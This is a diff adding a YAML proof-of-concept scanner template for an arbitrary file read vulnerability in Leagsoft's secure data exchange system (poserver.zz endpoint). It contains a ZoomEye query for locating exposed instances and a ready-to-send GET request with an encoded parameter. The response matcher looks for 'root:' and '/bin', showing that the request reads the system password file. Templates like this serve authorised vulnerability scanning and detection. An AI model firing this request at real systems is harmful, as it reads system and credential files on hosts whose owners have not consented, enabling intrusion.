@@ -1,0 +1,15 @@
+id: poc-yaml-leagsoft-poserver-zz-anyfile-read
+info:
+  name: 联软安全数据交换系统 poserver.zz 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 联软安全数据交换系统
+  zoomeye: app:"联软安全数据交换系统"
+requests:
+- method: GET
+  path: /UniExServices/poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI=
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"filename=\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
